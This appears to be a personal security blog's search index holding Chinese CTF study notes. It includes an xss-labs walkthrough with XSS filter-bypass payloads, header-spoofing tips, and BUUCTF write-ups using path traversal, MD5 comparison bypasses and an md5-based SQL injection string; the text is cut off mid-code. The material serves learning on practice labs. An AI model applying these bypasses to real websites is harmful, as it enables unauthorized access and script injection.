<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>杂记</title>
    <link href="/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/"/>
    <url>/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>本地访问</p><p>X-Real-Ip:<br>X-Forwarded-For:<br>Client-Ip:</p><p>代理（从哪个网站）</p><p>Via:</p><p>Referer(从哪个网站)</p><p>User-Agent（从哪个浏览器）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/kele6.github.io/2024/04/15/xss/"/>
    <url>/kele6.github.io/2024/04/15/xss/</url>
    
    <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: xss1<br>date: 2024<span class="hljs-string">-04</span><span class="hljs-string">-15</span> 14:18:20<br><span class="hljs-keyword">tags:</span><br></code></pre></td></tr></table></figure><h1 id="xsslabs"><a href="#xsslabs" class="headerlink" title="xsslabs"></a>xsslabs</h1><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><h2 id="level-1—–无过滤"><a href="#level-1—–无过滤" class="headerlink" title="level-1—–无过滤"></a>level-1—–无过滤</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">无过滤直接：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-2——闭合标签"><a href="#level-2——闭合标签" class="headerlink" title="level-2——闭合标签"></a>level-2——闭合标签</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">闭合标签：&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-3—–单引号闭合-js"><a href="#level-3—–单引号闭合-js" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤） 可以js：’onclick&#x3D;’javascript:alert(123)’            ‘onfocus&#x3D;’javascript:alert(123)’                    ‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了 后面加 &#x2F;&#x2F;  &gt; 也是可以的</p><h2 id="level-4—–双引号闭合-js"><a href="#level-4—–双引号闭合-js" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js： “onclick&#x3D;javascript:alert(1)&#x2F;&#x2F; “onclick&#x3D;’javascript:alert(1)’</p><h2 id="level-5-—–js伪协议"><a href="#level-5-—–js伪协议" class="headerlink" title="level-5 —–js伪协议"></a>level-5 —–js伪协议</h2><p>部分代码：</p><p>$str &#x3D; strtolower($_GET[“keyword”]); $str2&#x3D;str_replace(“&lt;script”,”&lt;scr_ipt”,$str); $str3&#x3D;str_replace(“on”,”o_n”,$str2);</p><p>js伪协议：发现script和on都被替换， 这一关我们利用<code>&lt;a&gt;</code>标签绕过进行绕过。 <code>&quot;&gt; &lt;a href=javascript:alert(123)&gt;xss&lt;/a&gt;</code></p><h2 id="level-6—–大小写绕过"><a href="#level-6—–大小写绕过" class="headerlink" title="level-6—–大小写绕过"></a>level-6—–大小写绕过</h2><p>大小写绕过： <code>&#39;&quot;&gt;&lt;a Href=javascript:alert(11)&gt;aa&lt;/a&gt;//</code> <code>&quot;&gt; &lt;ScripT&gt;alert(1)&lt;/ScRipT&gt;</code></p><h2 id="level-7—–双写绕过"><a href="#level-7—–双写绕过" class="headerlink" title="level-7—–双写绕过"></a>level-7—–双写绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`<span class="hljs-meta">&lt;?php</span>` <br>`***<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);***`<br>`***<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];***`<br>`***<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);***`<br>`***<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);***`<br>`***<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);***`<br>`***<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);***`<br>`***<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);***`<br></code></pre></td></tr></table></figure><p>$str2 变量通过 str_replace(“&lt;script”,”&lt;scr_ipt”,$str); 将字符串中的 &lt;script 替换为 &lt;scr_ipt，防止恶意脚本的注入。————其他的一样</p><p><strong>href被替换成空，所以我们可以想到，使用双写进行绕过</strong> <code>&quot;&gt;&lt;scrscriptipt&gt;alert(32);&lt;/scrscriptipt&gt;</code> <code>&#39;&quot;&gt;&lt;a HRhrefEF=&#39;javascrscriptipt:alert(&quot;jaden&quot;)&#39;&gt;jaden&lt;/a&gt;</code></p><h2 id="level-8—–编码绕过"><a href="#level-8—–编码绕过" class="headerlink" title="level-8—–编码绕过"></a>level-8—–编码绕过</h2><p>发现内容输出在了a标签的href属性中，当我们测试的时候发现，javascript不仅加了_，并且使用了html实体编码，将特殊符号进行了编码，导致不能进行标签闭合，那么既然内容放到了某个标签的属性值里面，我们说过，属性值是可以进行编码绕过的，尝试html实体编码绕过。 javascript:alert(“jaden”) 编码：整个进行编码 采用<em><strong>十进制ascii码</strong></em> javascript:alert(“jaden”) 或者<em><strong>十六进制unicode编码</strong></em> javascript :alert(“ja den”)</p><h2 id="level-9—–http协议校验-指定内容绕过"><a href="#level-9—–http协议校验-指定内容绕过" class="headerlink" title="level-9—–http协议校验(指定内容绕过)"></a>level-9—–http协议校验(指定内容绕过)</h2><p>发现，上面的这几种绕过方式都不行了，但是看到一个友情链接，写上一个正确的http网址可以看到输 出在了href属性中，也就是说，做了网址格式的校验，看后台代码发现其实就是http协议校验，那么我 们可以巧用js代码中的注释符号 &#x2F;&#x2F; 。</p><p>javascript:alert(“jaden”)&#x2F;&#x2F;<a href="http://www.baidu.com/">http://www.baidu.com</a> #但是前面的 javascript:alert(“jaden”)要进行编码，不然会被加上_</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">javascript:ale&amp;<span class="hljs-string">` `</span>#<span class="hljs-number">114</span>;t(<span class="hljs-string">&quot;jaden&quot;</span>)//http://www.baidu.c<span class="hljs-string">` `</span>om<span class="hljs-string">` `</span>javascript:alert()<span class="hljs-comment">/* http:// */</span><br></code></pre></td></tr></table></figure><p><em><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</em> </p><h2 id="level10—–get传参，隐藏的input标签可以插入type-”text”显示"><a href="#level10—–get传参，隐藏的input标签可以插入type-”text”显示" class="headerlink" title="level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示"></a>level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str11 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str22=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11)<span class="hljs-comment">;</span><br><br><br><br>$str33=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这两行代码对 $str11 变量进行字符串替换操作。首先，它移除了 $str11 中所有的 “&gt;” 字符，然后将结果存储在 $str22 中。接着，它移除了 $str22 中所有的 “&lt;” 字符，并将结果存储在 $str33 中首先，输出一个居中的 <code>&lt;h2&gt;</code> 标题，提示用户没有找到和 $str 相关的结果。这里使用htmlspecialchars() 函数来确保 $str 中的特殊字符被正确转义，接着，输出一个表单，其中包含了三个隐藏的输入字段：t_link、t_history 和 t_sort。前两个字段的值都被设置为空字符串，而第三个字段的值被设置为 $str33（即处理过的 $str11）<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p>修改为text<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p><strong>payload:?t_sort&#x3D;onfocus&#x3D;javascript:alert() type&#x3D;”text”</strong></p><p><em><strong>小结：根据源码猜解传参的参数名，隐藏的input标签可以插入type&#x3D;”text”显示</strong></em></p><h2 id="level-11—–referer"><a href="#level-11—–referer" class="headerlink" title="level-11—–referer"></a>level-11—–referer</h2><p><code>&lt;input&gt;</code>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看（<strong>都不行</strong>） <strong>那应该就referer头了，用burpsuite抓包一下，添加http头</strong> Referer: “ sRc DaTa OnFocus <code>&lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</code> <code>j</code> 对比发现，把大于小于号&gt;&lt;给删掉了，但是我们还能用onfocus，构造一个http头： Referer: “ onfocus&#x3D;javascript:alert() type&#x3D;”text <strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p><h2 id="level-12—–User-Agent头"><a href="#level-12—–User-Agent头" class="headerlink" title="level-12—–User-Agent头"></a>level-12—–User-Agent头</h2><p>User-Agent: “ onfocus&#x3D;javascript:alert() type&#x3D;”text</p><h2 id="level-13—–Cookie头"><a href="#level-13—–Cookie头" class="headerlink" title="level-13—–Cookie头"></a>level-13—–Cookie头</h2><p>Cookie：” onclick&#x3D;alert() type&#x3D;”text </p><h2 id="level-14—–Pass"><a href="#level-14—–Pass" class="headerlink" title="level-14—–Pass"></a>level-14—–Pass</h2><h2 id="level-15—–ng-include文件包涵，可以无视html实体化"><a href="#level-15—–ng-include文件包涵，可以无视html实体化" class="headerlink" title="level-15—–ng-include文件包涵，可以无视html实体化"></a>level-15—–ng-include文件包涵，可以无视html实体化<img src="https://img-blog.csdnimg.cn/ff0bfa43bf4d454e881ce358844c9651.png" alt="img"></h2><p>ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。——–<em><strong>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</strong></em> ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。</p><p>语法 &lt; element  ng-include&#x3D; “filename”  οnlοad&#x3D; “expression”  autoscroll&#x3D; “expression”  &gt; &lt; &#x2F;element &gt; ng-include 指令作为元素使用:</p><p>&lt; ng-include  src&#x3D; “filename”  οnlοad&#x3D; “expression”  autoscroll&#x3D; “expression”  &gt; &lt; &#x2F;ng-include &gt; 所有的 HTML 元素都支持该指令。</p><p>参数值 值:描述 filename:文件名，可以使用表达式来返回文件名。 onload:可选， 文件载入后执行的表达式。 autoscroll:可选，包含的部分是否在指定视图上可滚动。</p><p>原文链接：<a href="https://blog.csdn.net/u011127019/article/details/53666528/">https://blog.csdn.net/u011127019/article/details/53666528/</a></p><p><strong>开始做题：</strong> <strong>1</strong>.我们先试试看包涵第一关，构建payload：?src&#x3D;’&#x2F;level1.php’ <img src="https://img-blog.csdnimg.cn/2f2dd7d829ab4796a3f99eb55c5f6a79.png" alt="img"></p><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload ?src&#x3D;” ‘ sRc DaTa OnFocus <code>&lt;s</code>CriPt&gt; &lt;a hReF&#x3D;javascript:alert()<code>&gt;</code> j <img src="https://img-blog.csdnimg.cn/4824b5a8ac984052b118e85e0ef7d723.png" alt="img"></p><p>**2.**对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;、&lt;input&gt;、&lt;img&gt;、&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload ：?src&#x3D;’&#x2F;level1.php?name&#x3D;&lt;img src&#x3D;1 onmouseover&#x3D;alert()&gt;’ **3.**当鼠标移动到图片的时候就触发了弹窗 <img src="https://img-blog.csdnimg.cn/16343a7a36204eb9883842c0fade4146.png" alt="img"></p><p>当然也能用p标签，可以构造payload：?src&#x3D;’&#x2F;level1.php?name&#x3D;<code>&lt;</code>p onmousedown&#x3D;alert()&gt;哈哈哈&lt;&#x2F;p<code>&gt;</code>‘ 点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码 <img src="https://img-blog.csdnimg.cn/454dfa88edfc4ef8be18f846f5b6aff8.png" alt="img"></p><h2 id="level-16—–回车代替空格绕过检测"><a href="#level-16—–回车代替空格绕过检测" class="headerlink" title="level-16—–回车代替空格绕过检测"></a>level-16—–回车代替空格绕过检测</h2><p><strong>1.</strong><img src="https://img-blog.csdnimg.cn/3cc75094c9d4495eac9cbb7bfa8c7e17.png" alt="img"></p><p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字：?<code>keyword=&quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; j</code>  <code>.Kht.m.1..….g...app&gt;2 &lt;head&gt;</code> <code>3</code></p><p>&lt;body<code>&gt;</code>span class&#x3D;”ng-include:” ’sRc DaTa OnFocus &lt;sCriPtgt; 6lt;a hReF&#x3D;-javascript:alert()kgt ; “Xlspan(&#x2F;body 18</p><p>**2.**对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签&lt;p οnmοusedοwn&#x3D;alert()&gt;abc&lt;&#x2F;p<code>&gt;</code>，谁知道也将&#x2F;给替换成了空格，无奈，只好看一下后端源码 <code>$str2=str_replace(&quot;script&quot; , &quot; &quot;,$str);</code> $str3&#x3D;str_replace(“ “, “ “ ,$str2); $str4&#x3D;str_replace(“&#x2F;“, “ “,$str3); $str5&#x3D;str_replace(“ “, “ “ ,$str4); echo “<code>&lt;center&gt;</code>“.$str5.”<code>&lt;/center</code>&gt;”;?&gt;&#96;</p><p>**3.**果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用&#x2F;的<code>&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;</code>等标签，更多标签可参考<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签</a></p><p>随便选个标签，将空格替换成回车的url编码，构造payload  ?keyword&#x3D;&lt;svg%0Aonload&#x3D;alert(1)&gt;</p><h2 id="level-17—–embed标签"><a href="#level-17—–embed标签" class="headerlink" title="level-17—–embed标签"></a>level-17—–embed标签</h2><p><code>&lt;e</code>mbed src&#x3D;”xsf01.swf ?a&#x3D;b” width&#x3D;”100%” heigth&#x3D;”100%”&gt; </p><p>这个传入了两个值，分别作为src中的xsf01.swf的变量和值传入,观察一下发现这个embed  标签就是引入一个  swf  文件到浏览器端，并且它的  src  属性值没有添 </p><p>  加引号所以 不用闭合。 </p><p>构造payload     ‘ οnclick&#x3D;alert() <img src="https://img-blog.csdnimg.cn/direct/be82d9feca8f41d5ab6ae37fd01d6c57.png" alt="img"></p><h2 id="level-18—–同17"><a href="#level-18—–同17" class="headerlink" title="level-18—–同17"></a>level-18—–同17</h2><h2 id="level-19—–Pass"><a href="#level-19—–Pass" class="headerlink" title="level-19—–Pass"></a>level-19—–Pass</h2><h2 id="level-20—–Pass"><a href="#level-20—–Pass" class="headerlink" title="level-20—–Pass"></a>level-20—–Pass</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF</title>
    <link href="/kele6.github.io/2024/04/14/XYCTF/"/>
    <url>/kele6.github.io/2024/04/14/XYCTF/</url>
    
    <content type="html"><![CDATA[<p>我是菜鸟鸟</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/kele6.github.io/2024/04/14/BUUCTF/"/>
    <url>/kele6.github.io/2024/04/14/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="HCTF-2018-WarmUp-代码审计"><a href="#HCTF-2018-WarmUp-代码审计" class="headerlink" title="[HCTF 2018]WarmUp(代码审计)"></a>[HCTF 2018]WarmUp(代码审计)</h2><p>源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;<strong>flag not here, and flag in ffffllllaaaagggg</strong>&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagggg</p><p>解析source.php的代码<br><code>if (! empty($_REQUEST[&#39;file&#39;])       &amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;       include $_REQUEST[&#39;file&#39;];exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;&#125;</code><br>一步步解析：<br>$_REQUEST</p><pre><code class="hljs">    变量 $_REQUEST用于收集HTML表单提交的数据，默认情况下包含了$_GET，$_POST和$_COOKIE的数组。    GET是从服务器上获取数据，GET是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。    POST是向服务器传送数据，POST是通过HTTP POST机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址，用户看不到这个过程。    通过POST和GET方法提交的所有数据都可以通过$_REQUEST[&quot;参数&quot;]获得。</code></pre><p>empty()</p><pre><code class="hljs">    empty(var) 函数用于检查一个变量是否为空，当 变量var 存在，并且是一个非空非零的值时返回 FALSE 否则返回 TRUE。</code></pre><p>is_string()</p><pre><code class="hljs">    is_string(var)检测变量是否是字符串，如果var是字符串则返回true，否则返回false。</code></pre><p>include</p><pre><code class="hljs">    include语句包含并运行指定文件。    文件查找过程：    1、被包含文件先按参数给出的路径寻找。    2、如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找。    3、如果在include_path下没找到该文件，则include最后才在调用脚本文件所在的目录和当前工作目录下寻找。    4、如果最后仍未找到文件则include会发出一条警告。</code></pre><p>逻辑结构</p><pre><code class="hljs">    传入的file参数需满足以下3个条件，才可包含并运行file：    （1）不为空    （2）为字符串    （3）emmm::checkFile($_REQUEST[&#39;file&#39;]) 返回 true</code></pre><p>mb_substr()</p><pre><code class="hljs">    mb_substr ( string $str , int $start , int $length )            mb_substr() 函数从$str的$start字符位置开始，截断$length个字符并返回字符串。$str的第一个字符的位置是 0，第二个字符的位置是 1，以此类推。    类似substr() 函数，substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</code></pre><p><strong>mb_strpos()</strong></p><p>​    <code>mb_strpos(haystack, needle)，查找字符串needle在另一个字符串haystack中首次出现的位置，返回位置(int)。第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</code></p><p><code>$_page = mb_substr(     $page,     0,     mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); $_page = urldecode($page);</code><br><code>$_page = mb_substr(     $_page,</code><br>    <code>0,</code><br>    <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code><br><code>);</code></p><p>if语句中的$_page经历了如下改变：一次问号截断，一次url解码，一次问号截断——–url传入服务器会自动进行一次urldecode.  ?的url编码为%3F，双重url编码为%253F。</p><p>那问题就很容易解决了<br>payload:?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg——-..&#x2F;代表返回上级目录——–..&#x2F;是一个一个试的，未知有几个文件夹</p><h2 id="MRCTF2020-Ez-bypass-md5"><a href="#MRCTF2020-Ez-bypass-md5" class="headerlink" title="MRCTF2020]Ez_bypass(md5)"></a>MRCTF2020]Ez_bypass(md5)</h2><p><strong>代码审计</strong><br>&#x2F;&#x2F; 包含外部文<br>件 ‘flag.php’，该文件可能包含敏感信息<br>include ‘flag.php’;<br>&#x2F;&#x2F; 定义一个变量 $flag，包含一个字符串<br>$flag &#x3D; ‘MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}’;</p><p>&#x2F;&#x2F; 检查是否存在名为 ‘gg’ 和 ‘id’ 的 GET 参数<br>if(isset($_GET[‘gg’]) &amp;&amp; isset($_GET[‘id’])) {<br>    &#x2F;&#x2F; 获取 GET 参数 ‘id’ 和 ‘gg’ 的值<br>    $id &#x3D; $_GET[‘id’];<br>    $gg &#x3D; $_GET[‘gg’];</p><pre><code class="hljs">// 检查 $id 和 $gg 的 MD5 散列值是否相等，并且它们的值不相等，强比较if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;    // 输出 &#39;You got the first step&#39;    echo &#39;You got the first step&#39;;     // 检查是否存在名为 &#39;passwd&#39; 的 POST 参数    if(isset($_POST[&#39;passwd&#39;])) &#123;        // 获取 POST 参数 &#39;passwd&#39; 的值        $passwd = $_POST[&#39;passwd&#39;];         // 检查 $passwd 是否为数字        if (!is_numeric($passwd)) &#123;            // 如果 $passwd 等于 1234567，则输出 &#39;Good Job!&#39;，显示 &#39;flag.php&#39; 的内容，然后终止脚本执行            if($passwd == 1234567) &#123;                echo &#39;Good Job!&#39;;                highlight_file(&#39;flag.php&#39;);                die(&#39;By Retr_0&#39;);            &#125; else &#123;                // 如果 $passwd 不等于 1234567，则输出 &#39;can you think twice??&#39;                echo &quot;can you think twice??&quot;;            &#125;        &#125; else &#123;            // 如果 $passwd 是数字，则输出 &#39;You can not get it !&#39;  可以数字+字母 如：12345a            echo &#39;You can not get it !&#39;;        &#125;    &#125; else &#123;        // 如果不存在 POST 参数 &#39;passwd&#39;，则输出 &#39;only one way to get the flag&#39;        die(&#39;only one way to get the flag&#39;);    &#125;&#125; else &#123;    // 如果 $id 和 $gg 的 MD5 散列值不相等，或者它们的值相等，则输出 &#39;You are not a real hacker!&#39;    echo &quot;You are not a real hacker!&quot;;&#125;</code></pre><p>} else {<br>    &#x2F;&#x2F; 如果不存在 ‘gg’ 和 ‘id’ 的 GET 参数，则输出 ‘Please input first’<br>    die(‘Please input first’);<br>}<br><strong>很常见的md5比较</strong><br><code>若为弱比较：</code></p><p><code>md5加密后为0e开头的会被识别为科学记数法，结果均为0</code></p><p><code>例如：para1=QNKCDZO ，para2=aabg7XSs</code></p><p><code>md5（para1）=0e830400451993494058024219903391</code></p><p><code>md5（para2）=0e087386482136013740957780965295</code></p><p><code>此时MD5（para1）== MD5（para2）</code></p><p>另加：数组绕过&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;222</p><p><code>若为强比较：</code></p><p><code>如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，并且不会报错，就会得到===强比较的值相等</code></p><p><code>例如：para1[]=111  ,  para2[]=222</code></p><p><code>此时md5（para1）=== md5（para2）</code><br>显而易见 payload：&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;2  POST:passwd&#x3D;1234567a</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>源代码：发现秘密：Secret.php</p><p>It doesn’t come from ‘<a href="https://Sycsecret.buuoj.cn'==>Referer">https://Sycsecret.buuoj.cn&#39;==&gt;Referer</a></p><p>Please use “Syclover” browser&#x3D;&#x3D;&gt;Uesr Agent </p><p>No!!! you can only read this locally!!!&#x3D;&#x3D;&gt;X-Forwarded-For: 127.0.0.1<br>(另几种表达：X-Real-Ip: 127.0.0.1   Client-Ip: 127.0.0.1)</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>随便查询，无回响，查看源码，发现：<!-- /header end -->HTTP有header&#x3D;&#x3D;&gt;发现<em>Hint select * from ‘admin’ where password&#x3D;md5($pass,true)</em></p><p>一个sql语句，要输入一个密码但是并不知道正确密码。这里需要利用md5绕过，让sql语句变成如下形式  <strong>select * from ‘admin’ where password&#x3D;‘’ or ‘1</strong>（很基本的sql）</p><p><a href="https://www.cnblogs.com/redfish404/articles/17878453.html">https://www.cnblogs.com/redfish404/articles/17878453.html</a></p><p>上网查找后发现字符串“<strong>ffifdyop</strong>”和“129581926211651571912466741651878684928”在进行<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后形成的十六进制的字符串经过mysql转换成十进制后对应的ASCII码内容为“or ‘ 6……”——ffifdyop-&gt;276f722736c95d99e921722cf9ed621c-&gt;’or’6É]é!r,ùíb</p><p>进入新页面，什么也没有，查看源代码</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>很基本的md5&#x3D;&#x3D;&gt;0e绕过或者数组绕过都行&#x3D;&#x3D;进入下一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;<br>highlight_file(__FILE__);<br>if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))<br>&#123;  echo $flag;&#125; <br></code></pre></td></tr></table></figure><p>这个只能数组绕过&#x3D;&#x3D;&gt;param1[]&#x3D;1&amp;param2[]&#x3D;2</p><h2 id="极客大挑战-2019-Secret-File-信息泄露、文件包含"><a href="#极客大挑战-2019-Secret-File-信息泄露、文件包含" class="headerlink" title="[极客大挑战 2019]Secret File(信息泄露、文件包含)"></a>[极客大挑战 2019]Secret File(信息泄露、文件包含)</h2><p>页面什么也没有，查看源代码&#x3D;&#x3D;&gt;href&#x3D;”.&#x2F;Archive_room.php”</p><p>打开，点击按钮，提示“没看清么？回去再仔细看看吧。”</p><p>让我们退回去仔细看看，说明在这两个页面之间存在一些内容，右键「检查」<br>返回上一个页面（Archive_room.php）重新点击一次 SECRET 按钮，观察这一过程有哪些「请求」&#x3D;&#x3D;&gt;在结束页面之前，还访问了一个页面&#x2F;action.php，只是我们没有「权限」（302），看不了，所以直接跳过了这个页面。针对这种情况，使用<a href="https://so.csdn.net/so/search?q=burp&spm=1001.2101.3001.7020">burp</a>抓包进行访问<br>发现   secr3t.php   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 